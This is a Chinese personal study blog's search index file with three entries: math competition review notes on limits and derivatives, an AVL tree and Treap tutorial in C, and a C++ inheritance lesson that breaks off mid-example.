<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>大学生数学竞赛微分相关知识的复习</title>
    <url>/2021/08/16/2021-8-16-%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E7%AB%9E%E8%B5%9B%E5%BE%AE%E5%88%86%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%9A%84%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h1><h2 id="前导"><a href="#前导" class="headerlink" title="前导"></a>前导</h2><ol>
<li>不为计算而计算，很多时候是为了便于分析，比如定义$e=\lim_{n\to +\infty}{\sum_{i=1}^n\frac{1}{n!}}$</li>
<li>要注意的是抓住主要矛盾，比如计算极限$\lim_{n \to +\infty} \sum_{k=1}^{n}\frac{k^n}{n^n}$</li>
</ol>
<h2 id="极限的典型方法"><a href="#极限的典型方法" class="headerlink" title="极限的典型方法"></a>极限的典型方法</h2><ol>
<li><p>定义，即$\epsilon-\delta$语言</p>
</li>
<li><p>四则运算</p>
</li>
<li><p>等价无穷小替换（两个重要极限）</p>
</li>
<li><p>L’ Hospital法则，注意使用条件</p>
</li>
<li><p>夹逼定理</p>
</li>
<li><p>单调有界收敛定理</p>
</li>
<li><p>Taylor展开</p>
</li>
<li><p>Stolz定理</p>
<p>设${x_n}$严格单调增加，且$\lim_{n \to \infty}x_n=+\infty$,若$\lim_{n\to\infty}\frac{y_{n+1}-y_n}{x_{n+1}-x_n}=a$，则有$\lim_{n \to \infty}\frac{y_n}{x_n}=a$</p>
<p>设$x_n$严格单调，且$\lim_{n \to \infty}x_n=0,\lim_{n \to\infty}y_n=0$，若$\lim_{n\to\infty}\frac{y_{n+1}-y_n}{x_{n+1}-x_n}=a$，则$\lim_{n\to\infty}\frac{y_n}{x_n}=a$</p>
</li>
</ol>
<h2 id="典型例题"><a href="#典型例题" class="headerlink" title="典型例题"></a>典型例题</h2><ol>
<li><p>主要比较难以看出来的就是使用夹逼准则的求和极限，这时候大多数时候都需要通过恒等变形和放缩来利用夹逼准则转换成黎曼和，如$\lim_{n \to +\infty} \sum_{k=1}^n \frac{a^\frac{k}{n}}{n+(a-1)k^{-1}}$</p>
</li>
<li><p>当含有三角函数和积分时，最佳的做法应该是根据三角函数的有界性将积分做掉，例如$\lim_{x \to+\infty}\sqrt[3]{x}\int_x^{x+1}\frac{sint}{\sqrt[]{t+cost}}dt$</p>
</li>
<li><p>对于极限$\lim_{n \to \infty}\sum_{k=0}^n\frac{1}{n+k}$，有多种不同的做法，这里主要想提一下欧拉常数，即$\lim_{n\to\infty}\sum_{k=1}^n\frac{1}{k}-lnn=\gamma_n$，其中$\lim_{n \to\infty}\gamma_n=C$</p>
</li>
<li><p>PPT31页值得再看</p>
</li>
<li><p>与积分相结合的极限题目</p>
<ol>
<li><p>通过观察转换成Riemann和，下面给几个例子</p>
<p> $\lim\sum_{k=1}^{n-1}(1+\sqrt[]\frac{k}{n})sin\frac{k\pi}{n^2}$</p>
</li>
<li><p>利用积分中值定理和微分中值定理进行化简，下面给一个很经典的例子，即</p>
<ol>
<li>设f(x)在[0,1]上有连续导数，f(0)=0,f(1)=1,证明:<br>$\lim_{n \to \infty}n(\int_{0}^{1}f(x)dx-\frac{1}{n}\sum_{k=1}^{n}f(\frac{k}{n}))$</li>
</ol>
</li>
<li><p>在存在k之类和三角函数时可以考虑求递推式，如求$\lim_{x \to 0^+}\frac{\int_0^xsin^k\frac{1}{t}dt}{x},k=1,2,…$</p>
</li>
<li><p>然后就是一道代数变形不太好想的题目，即$\lim_{n \to \infty}\sqrt[n+1]{(n+1)!}-\sqrt[n]{n!}$</p>
</li>
</ol>
</li>
<li><p>单调有界定理队函数和数列统统适用</p>
</li>
<li><p>泰勒展开式是一种非常重要的方法，或许可以看作是等价无穷小，这方面的例题很多，需要注意的是$tanx$和$(1+x)^\alpha$的泰勒展开式，将其转化成在0附近，就可以展开，下面给出几个题</p>
<ol>
<li>$\lim_{x \to0}\frac{(1+x)^\frac{2}{x}-e^2(1-ln(1+x))}{x}$，该题目需要注意的是在有减法的时候不要随意用等价无穷小！尽量先用泰勒公式展开</li>
</ol>
</li>
<li><p>Stolz定理</p>
<p>使用stolz定理的关键就在于构造出满足条件的式子，这里PPT上给出的题目基本都是谢惠民上的题目，此处不再赘述</p>
</li>
</ol>
<hr>
<h1 id="连续"><a href="#连续" class="headerlink" title="连续"></a>连续</h1><h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><ol>
<li>介值性</li>
<li>最值性</li>
</ol>
<h2 id="典型例题-1"><a href="#典型例题-1" class="headerlink" title="典型例题"></a>典型例题</h2><ol>
<li>这里的典型例题大多是利用反证法导出矛盾</li>
</ol>
<hr>
<h1 id="导数"><a href="#导数" class="headerlink" title="导数"></a>导数</h1><ol>
<li><p>导数，单侧导数，微分，偏导数，全微分，方向导数</p>
</li>
<li><p>高阶导数的计算，主要利用Leibniz求导公式</p>
</li>
<li><p>这里就贴几道让我印象深刻的题目，</p>
<p>已知$y=\frac{2x}{x^2+1}$，求$y^{(n)}$</p>
<p>已知$y=\frac{x^n}{(x+1)^2(x+2)^2}$，求$y^{(n)}$</p>
<p>已知$y=(arcsinx)^2$，求$y^{(n)}(0)$</p>
</li>
</ol>
]]></content>
      <categories>
        <category>数学</category>
        <category>微分学</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>微积分</tag>
      </tags>
  </entry>
  <entry>
    <title>AVL树  Treap</title>
    <url>/2021/08/19/BST%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h2><p>​    二叉搜索树就是对于树中的每一个结点，其左子树都小于它，右子树都大于它，其查询效率为$log(n)$，但是，一旦输入的序列有序，二叉搜索树就退化成了链表，时间复杂度退化至$n$</p>
<p>​    正是由于二叉搜索树在这种情况下的劣势，我们考虑从两个方面对其进行优化，一是在每次插入的时候，考察此时的平衡因子，根据其值做适当的调整，来防止它出现单支树的情况，此即为AVL树，二是将输入的序列随机化，因为二叉搜索树在输入序列随机时具有较高的性能，这个时候需要加入一个另外的特征值来使其具有堆的性质，此即为Treap</p>
<h1 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h1><h2 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> height,data;</span><br><span class="line">    ArcNode *left,*right;</span><br><span class="line">&#125;*ArcTree,ArcNode;</span><br></pre></td></tr></table></figure>
<h2 id="调整"><a href="#调整" class="headerlink" title="调整"></a>调整</h2><ol>
<li><p>在插入新节点和删除结点的时候都需要进行所谓的旋转，即有四种类型</p>
</li>
<li><p>LL型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//		  2</span></span><br><span class="line"><span class="comment">//	    //</span></span><br><span class="line"><span class="comment">//	  1            -------&gt;  		1</span></span><br><span class="line"><span class="comment">//   //						   //	   \\</span></span><br><span class="line"><span class="comment">// 0						0			 2</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LL</span><span class="params">(AvlTree &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AvlTree q=T-&gt;left;</span><br><span class="line">    T-&gt;left=q-&gt;right;</span><br><span class="line">    q-&gt;right=T;</span><br><span class="line">    update(T);<span class="comment">//这里的更新主要是对于结点的高度进行更新，即左右子树的高度的最大值加一，具体题目具体去设计函数即可</span></span><br><span class="line">    update(q);</span><br><span class="line">    T=q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>RR型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//   2</span></span><br><span class="line"><span class="comment">//    \\</span></span><br><span class="line"><span class="comment">// 		1	------&gt;     		1</span></span><br><span class="line"><span class="comment">//         \\			    //		\\</span></span><br><span class="line"><span class="comment">//           0            2 			0</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RR</span><span class="params">(AvlTree &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AvlTree q=T-&gt;right;</span><br><span class="line">    T-&gt;right=q-&gt;left;</span><br><span class="line">    q-&gt;left=T;</span><br><span class="line">    update(T);</span><br><span class="line">    update(q);</span><br><span class="line">    T=q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>LR型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    2				2</span></span><br><span class="line"><span class="comment">//  //             //</span></span><br><span class="line"><span class="comment">// 1	----&gt;    0     ------&gt;  	  0</span></span><br><span class="line"><span class="comment">//  \\ 		   //				  //   \\</span></span><br><span class="line"><span class="comment">//	  0		 1					1		2</span></span><br><span class="line"><span class="comment">//      先右旋			 再左旋</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LR</span><span class="params">(AvlTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RR(T-&gt;left);</span><br><span class="line">    LL(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>RL型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//和上面差不多，这里就不画图了</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RL</span><span class="params">(AvlTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL(T-&gt;right);</span><br><span class="line">    RR(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="插入结点操作"><a href="#插入结点操作" class="headerlink" title="插入结点操作"></a>插入结点操作</h2><p>​    其实和二叉树的插入节点操作差不多，但是区别就在于需要在插入之后利用旋转操作对二叉树进行维护</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(AvlTree T,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)<span class="comment">//为空则初始化</span></span><br><span class="line">    &#123;</span><br><span class="line">        T=(ArcTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ArcNode));</span><br><span class="line">        T-&gt;left=<span class="literal">NULL</span>,T-&gt;right=<span class="literal">NULL</span>;</span><br><span class="line">        T-&gt;data=x;</span><br><span class="line">        T-&gt;height=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data&lt;x)<span class="comment">//根据定义判断插入到左支还是右支</span></span><br><span class="line">    &#123;</span><br><span class="line">        insert(T-&gt;right,x);</span><br><span class="line">        update(T);</span><br><span class="line">        <span class="keyword">if</span>(GetHeight(T-&gt;right)-GetHeight(T-&gt;left)&gt;<span class="number">1</span>)</span><br><span class="line">        &#123;<span class="comment">//检查更新后是否还是AVL树</span></span><br><span class="line">            <span class="keyword">if</span>(x&lt;T-&gt;right-&gt;data)<span class="comment">//分情况做旋转</span></span><br><span class="line">                RL(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                RR(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;data&gt;x)</span><br><span class="line">    &#123;</span><br><span class="line">        insert(T-&gt;left,x);</span><br><span class="line">        update(T);</span><br><span class="line">        <span class="keyword">if</span> (GetHeight(T-&gt;left)-GetHeight(T-&gt;right) &gt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (x &lt; T-&gt;left-&gt;data)</span><br><span class="line">                LL(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                LR(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>;</span><br><span class="line">    update(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="删除结点操作"><a href="#删除结点操作" class="headerlink" title="删除结点操作"></a>删除结点操作</h2><p>​    这是一种之前没学过的操作，但是具体其实和插入结点没有太多区别，主要分三类：</p>
<ol>
<li><p>如果左子树不存在，直接将右子树提上来</p>
</li>
<li><p>如果右子树不存在，直接将左子树提上来</p>
</li>
<li><p>如果都存在，有两种选择，既可以将左子树的最右结点拿上来，也可以将右子树的最左结点拿上来，这里选择第二种，代码几乎是一样的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">(AvlTree T,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data==x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;left&amp;&amp;T-&gt;right)<span class="comment">//左右子树都存在</span></span><br><span class="line">        &#123;</span><br><span class="line">            AvlTree q=T-&gt;right;</span><br><span class="line">            <span class="keyword">while</span>(q-&gt;left)<span class="comment">//找节点</span></span><br><span class="line">                q=q-&gt;left;</span><br><span class="line">            T-&gt;data=q-&gt;data;<span class="comment">//把这个结点替换到要删除的结点</span></span><br><span class="line">            Delete(T-&gt;right,q-&gt;data);<span class="comment">//然后删除最下面的那个，它一定没有左右子树，归到其他情况</span></span><br><span class="line">            update(T);</span><br><span class="line">            <span class="keyword">if</span>(GetHeight(T-&gt;left)-GetHeight(T-&gt;right)&gt;<span class="number">1</span>)<span class="comment">//由于这个时候删除了右子树的结点，所以只需要判断这个条件</span></span><br><span class="line">                <span class="keyword">if</span>(GetHeight(T-&gt;left-&gt;left)&gt;=GetHeight(T-&gt;left-&gt;right))<span class="comment">//这个时候由于删除的是叶子节点，只需要判断左右子树的高度</span></span><br><span class="line">                    LL(T);</span><br><span class="line">            	<span class="keyword">else</span></span><br><span class="line">                    LR(T);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//如果左右子树有没有的，直接提上来就可以了</span></span><br><span class="line">        &#123;</span><br><span class="line">            AvlTree q=T;</span><br><span class="line">            <span class="keyword">if</span>(T-&gt;left)</span><br><span class="line">                T=T-&gt;left;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;right)</span><br><span class="line">                T=T-&gt;right;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                T=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="built_in">free</span>(q);<span class="comment">//一定要free</span></span><br><span class="line">            q=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x&lt;T-&gt;data)</span><br><span class="line">    &#123;</span><br><span class="line">        Delete(T-&gt;left,x),update(T);</span><br><span class="line">        <span class="keyword">if</span> (GetHeight(T-&gt;right) - GetHeight(T-&gt;left) &gt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> (GetHeight(T-&gt;right-&gt;left) &lt;= GetHeight(T-&gt;right-&gt;right))</span><br><span class="line">                RR(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                RL(T);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Delete(T-&gt;right, x), update(T);</span><br><span class="line">        <span class="keyword">if</span> (GetHeight(T-&gt;left) - GetHeight(T-&gt;right) &gt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (GetHeight(T-&gt;left-&gt;left) &gt;= GetHeight(T-&gt;left-&gt;right))</span><br><span class="line">                LL(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                LR(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    update(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h2><ol>
<li>其他操作和二叉搜索树基本差不多</li>
</ol>
<h1 id="Treap"><a href="#Treap" class="headerlink" title="Treap"></a>Treap</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>​    Treap相比于普通的BST，每一个结点多了一个优先级，优先级是满足堆的性质的，所以这样就可以让他的结点保持一种随机的状态，防止成链</p>
<h2 id="结点类型"><a href="#结点类型" class="headerlink" title="结点类型"></a>结点类型</h2><p>​    这里采用了一个数组来存储左孩子和右孩子，可以有效减少代码量，相比于普通的二叉搜索树，多了另外的一个关键字</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> rank,data,size,same;</span><br><span class="line">	TreNode* son[<span class="number">2</span>];</span><br><span class="line">&#125;TreNode,*Treap;</span><br></pre></td></tr></table></figure>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h3><p>​    旋转相当于是Treap中最核心的操作了，这里只有左旋和右旋，下面以左旋为例说明</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里的左旋主要有两步，首先先将根节点的右孩子的左孩子作为根节点的右孩子，然后原来根节点的右孩子的左孩子变为原来的根节点即可</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Rotate</span><span class="params">(Treap &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Treap p=T-&gt;son[<span class="number">1</span>];</span><br><span class="line">    T-&gt;son[<span class="number">1</span>]=p-&gt;son[<span class="number">0</span>];</span><br><span class="line">    p-&gt;son[<span class="number">0</span>]=T;</span><br><span class="line">    T=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//事实上，可以将其统一成一个函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Rotate</span><span class="params">(Treap &amp;T,<span class="keyword">int</span> way)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Treap p=T-&gt;son[way^<span class="number">1</span>];</span><br><span class="line">    T-&gt;son[way^<span class="number">1</span>]=p-&gt;son[way];</span><br><span class="line">    p-&gt;son[way]=T;</span><br><span class="line">    T=p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>​    Treap的插入操作和BST差不多，只是在每次插入之后要判断是否需要旋转，旋转的方向由需要维护的堆的类型和插入子树根节点与当前根节点共同决定</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(Treap &amp;T,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        T=(TreNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TreNode));</span><br><span class="line">        T-&gt;son[<span class="number">0</span>]=<span class="literal">NULL</span>;</span><br><span class="line">        T-&gt;son[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">        T-&gt;data=x;</span><br><span class="line">        T-&gt;size=T-&gt;same=<span class="number">1</span>;</span><br><span class="line">        T-&gt;rank=rand();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    T-&gt;size++;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data&lt;x)</span><br><span class="line">    &#123;</span><br><span class="line">        Insert(T-&gt;son[<span class="number">1</span>],x);</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;son[<span class="number">1</span>]-&gt;rank&lt;T-&gt;rank) Rotate(T,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;data&gt;x)</span><br><span class="line">    &#123;</span><br><span class="line">        Insert(T-&gt;son[<span class="number">0</span>],x);</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;son[<span class="number">0</span>]-&gt;rank&lt;T-&gt;rank) Rotate(T,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> T-&gt;same++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>​    删除的方式也和二叉搜索树差不多</p>
<p>​    若删除元素原本存在多个，则只需将其存在个数减1即可。否则，若删除元素没有子节点，则直接将这个元素free即可。否则，若删除元素没有右子节点，或左子节点的优先级高于右子节点，就将以删除元素为根的子树右旋，我们可以发现，此时：原先的左子节点− − &gt; —&gt;−−&gt;新的根节点，原先的根节点− − &gt; —&gt;−−&gt;新的右子节点，因此，我们只要继续删除新的右子节点即可。否则，就将以删除元素为根的子树左旋，继续删除新的左子节点即可（与上面类似）。</p>
<p>​    这个删除的过程其实就是旋转之后将要删除的结点的高度降低，然后逐步递归，最后肯定会到达成为叶子节点的情况</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">(Treap &amp;T,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data==x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;same&gt;<span class="number">1</span>) T-&gt;same--,update(T),<span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;son[<span class="number">0</span>]||T-&gt;son[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(T-&gt;son[<span class="number">1</span>]==<span class="literal">NULL</span>||T-&gt;son[<span class="number">0</span>]-&gt;rank&gt;T-&gt;son[<span class="number">1</span>]-&gt;rank)</span><br><span class="line">                Rotate(T,<span class="number">1</span>),Delete(T-&gt;son[<span class="number">1</span>],x);</span><br><span class="line">            <span class="keyword">else</span> Rotate(T,<span class="number">0</span>),Delete(T-&gt;son[<span class="number">0</span>],x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">free</span>(T),T=<span class="literal">NULL</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;data&gt;x) Delete(T-&gt;son[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">else</span> Delete(T-&gt;son[<span class="number">1</span>],x);</span><br><span class="line">    update(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="其他操作-1"><a href="#其他操作-1" class="headerlink" title="其他操作"></a>其他操作</h3><ol>
<li>和二叉搜索树差不多</li>
</ol>
<h1 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h1><h2 id="AVL树-1"><a href="#AVL树-1" class="headerlink" title="AVL树"></a>AVL树</h2><p>​    查找时间复杂度：$O(log_2N)$</p>
<h2 id="Treap-1"><a href="#Treap-1" class="headerlink" title="Treap"></a>Treap</h2><p>​    查找时间复杂度：$O(log_2N)$</p>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>二叉树</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>C++学习（三）</title>
    <url>/2021/12/06/C-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="单继承类"><a href="#单继承类" class="headerlink" title="单继承类"></a>单继承类</h2><ol>
<li><p>用class声明的类的继承方式缺省为private，而用struct声明的类的继承方式缺省为public，而union既不能作为派生类的基类，也不能作为基类的派生类，基类成员在派生类中的访问权限由继承方式决定</p>
<ul>
<li>公有继承：基类的公有成员和保护成员派生到派生类时，都保持原有的状态；</li>
<li>保护继承：基类的公有成员和保护成员都变成派生类的保护成员；</li>
<li>私有继承：基类的公有成员和保护成员都变成派生类的私有成员；</li>
</ul>
<p><strong>注意，基类的私有成员也被继承到了派生类，但是对派生类不可见，如果需要可见，需要将其声明成基类的成员友元</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>;</span>		<span class="comment">//前向声明类B</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a, b;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>(<span class="keyword">int</span> x)&#123;a=x;&#125;</span><br><span class="line">    <span class="keyword">friend</span> B;   	<span class="comment">//声明B为A的友元类，B类成员可以访问A任何成员</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span>A&#123;    	 <span class="comment">//缺省为private继承，等价于class B: private A&#123;</span></span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">B</span>(<span class="keyword">int</span> x):<span class="built_in">A</span>(x)&#123; b=x; A::b=x; a+=<span class="number">3</span>; &#125; <span class="comment">//可访问私有成员A::a,A::b</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123; <span class="function">B <span class="title">x</span><span class="params">(<span class="number">7</span>)</span></span>; &#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>   <strong><em>要注意调用函数的时候调用的是哪个，是否需要加::，防止出现自递归</em></strong></p>
<p>   当继承方式为private的时候，很有可能出现不合理的情况，这个时候可以用<strong>基类::成员名</strong>或<strong>using 基类::成员名</strong>修改访问权限</p>
   <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POINT</span>:</span><span class="keyword">private</span> LOCATION&#123; <span class="comment">//private可省略</span></span><br><span class="line">		<span class="keyword">int</span> visible;		</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		LOCATION::getx;	<span class="comment">//修改权限成public</span></span><br><span class="line">		LOCATION::gety;	<span class="comment">//修改权限成public</span></span><br><span class="line">		<span class="function"><span class="keyword">int</span> <span class="title">isvisible</span><span class="params">( )</span></span>&#123; <span class="keyword">return</span> visible; &#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">( )</span>, <span class="title">hide</span><span class="params">( )</span></span>;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">moveto</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>;	</span><br><span class="line">		<span class="built_in">POINT</span>(<span class="keyword">int</span> x,<span class="keyword">int</span> y):<span class="built_in">LOCATION</span>(x,y)&#123; visible=<span class="number">0</span>; &#125;</span><br><span class="line">		~<span class="built_in">POINT</span>( )&#123; <span class="built_in">hide</span>( ); &#125;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>标识符作用域从小到大为：作用于函数成员、作用于类或派生类、作用于基类、作用于虚基类，标识符作用范围越小，被访问的优先级越高</p>
</li>
<li><p>单继承派生类的构造顺序为</p>
<ul>
<li>调用虚基类构造函数</li>
<li>调用基类构造函数</li>
<li>按照数据成员声明顺序，依次构造和初始化</li>
<li>执行派生类构造函数</li>
</ul>
<p>析构和构造顺序相反</p>
<p>由于这种题目必然会考，下面给一个例子，注意体会</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>(<span class="keyword">int</span> x):<span class="built_in">a</span>(x)&#123; std::cout&lt;&lt;a;&#125;<span class="comment">//也可在构造函数体内再次对a赋值</span></span><br><span class="line">    ~<span class="built_in">A</span>( )&#123;cout&lt;&lt;a;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span>A&#123;     <span class="comment">//私有继承，等价于class B: private A&#123;</span></span><br><span class="line">    <span class="keyword">int</span> b,c;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> d;<span class="comment">//B中定义有只读成员，故必须定义构造函数初始化</span></span><br><span class="line">    A 